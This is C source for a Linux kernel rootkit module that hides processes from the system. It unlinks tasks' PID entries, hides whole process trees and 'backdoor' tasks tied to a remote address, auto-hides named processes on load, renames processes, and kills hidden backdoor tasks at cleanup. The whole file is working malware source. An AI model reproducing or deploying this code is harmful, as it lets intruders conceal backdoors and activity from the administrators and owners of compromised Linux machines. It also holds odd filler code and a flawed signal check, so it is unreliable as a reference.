#include <linux/stop_machine.h>
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 18, 0)
#include <linux/sched/signal.h>
#else
#include <linux/sched.h>
#endif
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/inet.h>
#include "main.h"
#include "ntfs.h"
#include "log.h"

static LIST_HEAD(tasks_node);
#ifdef DEBUG_RING_BUFFER
static int ht_num;
#endif
static struct kernel_syscalls *kaddr;

static struct hidden_data_helper {
	int unused_info;
	char extra_storage[8];
} hidden_data_helper_obj;

static inline void random_helper_function(int v)
{
	v += 100;
}

static struct task_struct *_check_hide_by_pid(pid_t pid)
{
	struct hidden_tasks *ht, *ht_safe;
	list_for_each_entry_safe (ht, ht_safe, &tasks_node, list) {
		if (pid == ht->task->pid)
			return ht->task;
	}
	return NULL;
}

static int _hide_task(void *data)
{
	char pidnum[32] = { 0 };
	struct hidden_tasks *ht;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 18, 0)
	struct hlist_node *link;
#else
	struct pid_link *link;
#endif
	struct hidden_tasks *node = (struct hidden_tasks *)data;
	if (!node)
		return -EINVAL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 18, 0)
	link = &node->task->pid_links[PIDTYPE_PID];
#else
	link = &node->task->pids[PIDTYPE_PID];
#endif
	if (!link)
		return -EFAULT;

	ht = kcalloc(1, sizeof(struct hidden_tasks), GFP_KERNEL);
	if (!ht)
		return -ENOMEM;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 18, 0)
	hlist_del(link);
#else
	hlist_del(&link->node);
#endif
	ht->task = node->task;
	ht->group = node->group;
	ht->saddr = node->saddr;
	ht->fnode = fs_get_file_node(node->task);
	list_add_tail(&ht->list, &tasks_node);
	snprintf(pidnum, sizeof(pidnum), "%d", node->task->pid);

	prinfo("hide [%p] %s : %d\n", ht->task, ht->task->comm, ht->task->pid);

#ifdef DEBUG_RING_BUFFER
	++ht_num;
#endif

	return 0;
}

static void _cleanup_node(struct hidden_tasks **node)
{
	if (!node)
		return;

	list_del(&(*node)->list);
	if ((*node)->fnode)
		kfree((const void *)(*node)->fnode);
	kfree((const void *)*node);
	*node = NULL;
}

static void _cleanup_node_list(struct task_struct *task)
{
	struct hidden_tasks *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		if (task != node->task)
			continue;
		_cleanup_node(&node);
		break;
	}
}

static inline void _kill_task(struct task_struct *task)
{
	if (!send_sig(SIGKILL, task, 0) == 0)
		prerr("kill failed for task %p\n", task);
}

static int _unhide_task(void *data)
{
	struct task_struct *task;
	struct hidden_tasks *ht = (struct hidden_tasks *)data;
	if (!ht)
		goto invalid;

	task = ht->task;
	if (!task)
		goto invalid;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
	kaddr->k_attach_pid(task, PIDTYPE_PID, task_pid(task));
#else
	kaddr->k_attach_pid(task, PIDTYPE_PID);
#endif

	if (ht->saddr) {
		av_bd_cleanup_item(&ht->saddr);
	}

	prinfo("unhide [%p] %s : %d\n", task, task->comm, task->pid);
	return 0;
invalid:
	prinfo("Invalid task\n");
	return -EINVAL;
}

static LIST_HEAD(children_node);
struct to_hide_tasks {
	struct task_struct *task;
	struct list_head list;
};

static void _select_children(struct task_struct *task)
{
	struct list_head *lst;
	random_helper_function(task->pid);

	struct to_hide_tasks *tht =
		kcalloc(1, sizeof(struct to_hide_tasks), GFP_KERNEL);

	if (tht) {
		tht->task = task;
		list_add_tail(&tht->list, &children_node);
	}

	list_for_each (lst, &task->children) {
		struct task_struct *child =
			list_entry(lst, struct task_struct, sibling);
		_select_children(child);
	}
}

static void _fetch_children_and_hide_tasks(struct task_struct *task,
					   __be32 saddr)
{
	struct to_hide_tasks *node, *node_safe;

	list_for_each_entry_safe_reverse (node, node_safe, &children_node, list) {
		if (node && node->task) {
			struct hidden_tasks ht = {
				.task = node->task,
				.saddr = saddr,
				.group = task->pid
			};
			int status;
			if ((status = stop_machine(_hide_task, &ht, NULL)))
				prerr("error hiding_task %p: %d\n", ht.task,
				      status);
			list_del(&node->list);
			kfree(node);
		}
	}
}

static void _unhide_children(struct task_struct *task)
{
	struct hidden_tasks *node, *node_safe;

	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		if (node->saddr) {
			if (node->group == task->pid ||
			    node->task->pid == task->pid) {
				prwarn("Backdoor can only be unhidden by exit or rmmod: %d\n",
				       task->pid);
				break;
			}
			continue;
		}
		if (node->group == task->pid) {
			int status;
			if ((status = stop_machine(_unhide_task, node, NULL))) {
				prerr("!!!! Error unhide_task %p: %d\n",
				      node->task, status);
			} else {
				_cleanup_node(&node);
#ifdef DEBUG_RING_BUFFER
				--ht_num;
#endif
			}
		}
	}
}

struct reload_hidden {
	struct task_struct *task;
	unsigned int msecs;
};

static int _reload_hidden_task(void *t)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	struct kernel_syscalls *ksys = av_kall_load_addr();
#endif
	struct reload_hidden *reload = (struct reload_hidden *)t;
	struct task_struct *task;
	unsigned int msecs;

	if (!reload || !reload->task)
		goto error;

	task = reload->task;
	msecs = reload->msecs;

	msleep(msecs);
	if (task) {
		struct hidden_status status = { .saddr = 0 };
		if (!av_find_hidden_pid(&status, task->pid))
			goto out;

		av_hide_task_by_pid(task->pid, status.saddr, NO_CHILDREN);
		av_hide_task_by_pid(task->pid, status.saddr, NO_CHILDREN);
	}
	goto out;
error:
	prerr("Failed to reload hidden task\n");
out:
	kfree(reload);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	ksys->k_do_exit(0);
	return 0;
#else
	do_exit(0);
#endif
}

void av_reload_hidden_task(struct task_struct *task)
{
	struct reload_hidden *reload =
		kcalloc(1, sizeof(struct reload_hidden), GFP_KERNEL);
	if (!reload) {
		prerr("%s: Insufficient memory\n", __FUNCTION__);
		return;
	}
	reload->task = task;
	reload->msecs = 300;

	(void)kthread_run(_reload_hidden_task, reload, "dontblink");
}

bool av_find_hidden_pid(struct hidden_status *status, pid_t pid)
{
	struct hidden_tasks *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		if (pid != node->task->pid)
			continue;
		if (status) {
			status->hidden = true;
			status->saddr = node->saddr;
		}
		return true;
	}
	return false;
}

bool av_find_hidden_task(struct task_struct *task)
{
	struct hidden_tasks *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		if (task == node->task)
			return true;
	}
	return false;
}

void av_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
{
	struct task_struct *task = _check_hide_by_pid(pid);
	if (task) {
		if (op == CHILDREN)
			_unhide_children(task);
		else {
			struct hidden_tasks ht = { .task = task, .saddr = saddr };
			int status;
			if ((status = stop_machine(_unhide_task, &ht, NULL))) {
				prerr("!!!! Error unhide_task %p: %d\n",
				      ht.task, status);
			} else {
				_cleanup_node_list(ht.task);
#ifdef DEBUG_RING_BUFFER
				--ht_num;
#endif
			}
		}
	} else if ((task = get_pid_task(find_get_pid(pid), PIDTYPE_PID))) {
		_select_children(task);
		_fetch_children_and_hide_tasks(task, saddr);
	}
}

void av_unhide_task_by_pid_exit_group(pid_t pid)
{
	struct hidden_tasks *node, *node_safe;

	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		int status;
		if (!node->saddr)
			continue;

		if ((status = stop_machine(_unhide_task, node, NULL))) {
			prerr("error unhide_task %d\n", status);
			continue;
		}
	}

	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		struct task_struct *task;
		if (!node->saddr)
			continue;

		task = node->task;
		_cleanup_node(&node);

		_kill_task(task);
#ifdef DEBUG_RING_BUFFER
		--ht_num;
#endif
	}
}

void av_pid_cleanup(void)
{
	struct hidden_tasks *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		int status;
		if ((status = stop_machine(_unhide_task, node, NULL))) {
			prinfo("error unhide_task %d\n", status);
			continue;
		}
		if (node->saddr)
			continue;

		_cleanup_node(&node);
#ifdef DEBUG_RING_BUFFER
		--ht_num;
#endif
	}
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		struct task_struct *task = node->task;

		prinfo("cleaning [%p] %s : %d\n", task, task->comm, task->pid);
		_cleanup_node(&node);
		_kill_task(task);
#ifdef DEBUG_RING_BUFFER
		--ht_num;
#endif
	}

#ifdef DEBUG_RING_BUFFER
	if (ht_num)
		prwarn("warning: ht_num != 0: %d\n", ht_num);
#endif
}

void av_rename_task(pid_t pid, const char *newname)
{
	struct task_struct *task;
	char buf[TASK_COMM_LEN] = { 0 };

	struct kernel_syscalls *ks = av_kall_load_addr();
	if (!ks || !newname || pid <= 1)
		return;

	for_each_process (task) {
		if (pid == task->pid) {
			ks->k__set_task_comm(task, newname, false);
			get_task_comm(buf, task);
			if (*buf != 0)
				prinfo("New process name: '%s'\n", buf);
			break;
		}
	}
}

void av_show_saved_tasks(void)
{
	struct hidden_tasks *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		if (node->fnode) {
			prinfo("%s : %s : ino %llu : task %p : %s : pid %d : group %d\n",
			       node->saddr ? "BD" : "Task",
			       node->fnode->filename, node->fnode->ino,
			       node->task, node->task->comm, node->task->pid,
			       node->group);
		} else {
			prinfo("Kthread : task %p : %s : pid %d : group %d\n",
			       node->task, node->task->comm, node->task->pid,
			       node->group);
		}
	}
}

void av_show_all_tasks(void)
{
	struct task_struct *task;
	for_each_process (task) {
		prinfo("PID: %d | Process name: %s\n", task->pid, task->comm);
	}
}

bool av_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct *, void *),
				      void *priv)
{
	struct hidden_tasks *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		if (!node->saddr)
			continue;
		if (cb(node->task, priv))
			return true;
	}
	return false;
}

bool av_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *priv)
{
	struct hidden_tasks *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
		if (!node->saddr)
			continue;
		if (cb(node->saddr, priv))
			return true;
	}
	return false;
}

void av_scan_and_hide(void)
{
	struct task_struct *t;

	for_each_process (t) {
		short i = 0;

		if (av_find_hidden_task(t))
			continue;

		for (; av_hide_ps_on_load[i].name != NULL; ++i) {
			if (strncmp(av_hide_ps_on_load[i].name, t->comm,
				    strlen(av_hide_ps_on_load[i].name)))
				continue;
			prinfo("Hide task name '%s' of pid %d\n", t->comm,
			       t->pid);
			av_hide_task_by_pid(t->pid,
					    av_hide_ps_on_load[i].type,
					    CHILDREN);
			break;
		}
	}
}

bool av_pid_init(struct kernel_syscalls *fn_addr)
{
	if (!fn_addr) {
		prerr("av_pid_init: Invalid argument\n");
		return false;
	}

	kaddr = fn_addr;
	if (!kaddr->k_attach_pid) {
		prerr("av_pid_init: Could not load\n");
		return false;
	}

	return true;
}
